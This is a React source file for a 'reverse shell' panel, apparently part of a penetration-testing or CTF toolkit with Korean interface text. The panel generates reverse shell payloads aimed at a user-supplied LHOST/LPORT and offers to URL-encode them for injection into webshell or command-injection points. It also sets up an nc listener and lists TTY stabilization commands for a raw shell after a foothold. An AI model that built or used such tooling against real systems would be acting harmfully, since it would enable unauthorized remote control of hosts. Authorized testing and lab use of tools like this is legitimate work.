import { useState } from "react";
import {
  SHELL_PAYLOAD_KINDS, buildReverseShellPayload, type ShellPayloadKind,
} from "./reverseShellPayloads";

// A raw nc/webshell reverse shell has no job control, no tab completion,
// and dies if you press Ctrl+C — needed after nearly every foothold, so
// it lives right next to the payload that gets you the raw shell.
const STABILIZE_STEPS = [
  "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
  "export TERM=xterm",
  "# Ctrl+Z 로 백그라운드 전환 후:",
  "stty raw -echo; fg",
  "# 다시 쉘로 돌아온 뒤 Enter 두 번, 그리고 로컬 터미널 크기에 맞춰:",
  "stty rows <행수> columns <열수>",
];

// Getting a payload onto whatever RCE point was just found (webshell param,
// command injection, upload) and having a listener ready for it is close to
// universal across every box, so — unlike the other panels here — this
// isn't gated to a particular service type.
export default function ReverseShellPanel({ onStartListener }: {
  onStartListener: (port: string) => void;
}) {
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("443");
  const [kind, setKind] = useState<ShellPayloadKind>("nc-mkfifo");
  const [urlEncode, setUrlEncode] = useState(false);

  const payload = lhost.trim() && lport.trim()
    ? buildReverseShellPayload(kind, lhost.trim(), lport.trim())
    : "";
  const display = urlEncode ? encodeURIComponent(payload) : payload;

  return (
    <section className="netexecCredCheck" aria-labelledby="revshell-heading">
      <header>
        <h2 id="revshell-heading">리버스 쉘</h2>
        <small>RCE 지점(웹쉘·명령 인젝션 등)에 붙여넣을 페이로드를 만들고, 받을 리스너를 준비합니다.</small>
      </header>
      <div className="netexecCredForm">
        <input value={lhost} onChange={(e) => setLhost(e.target.value)}
          placeholder="LHOST (예: 10.10.14.5)" aria-label="LHOST" />
        <input value={lport} onChange={(e) => setLport(e.target.value)}
          placeholder="LPORT" aria-label="LPORT" />
        <select value={kind} onChange={(e) => setKind(e.target.value as ShellPayloadKind)}
          aria-label="쉘 종류">
          {SHELL_PAYLOAD_KINDS.map((item) => (
            <option key={item.id} value={item.id}>{item.label}</option>
          ))}
        </select>
        <button disabled={!lport.trim()} onClick={() => onStartListener(lport.trim())}>
          리스너 준비 (nc -lvnp)
        </button>
      </div>
      <label className="revshellEncode">
        <input type="checkbox" checked={urlEncode}
          onChange={(e) => setUrlEncode(e.target.checked)} />
        URL 인코딩 (GET 파라미터에 바로 붙여넣기용)
      </label>
      {payload && <code className="revshellPayload">{display}</code>}
      <details className="revshellStabilize">
        <summary>쉘 안정화 (Ctrl+C에도 안 죽게, 탭 완성·job control 살리기)</summary>
        <code className="revshellPayload">{STABILIZE_STEPS.join("\n")}</code>
      </details>
    </section>
  );
}
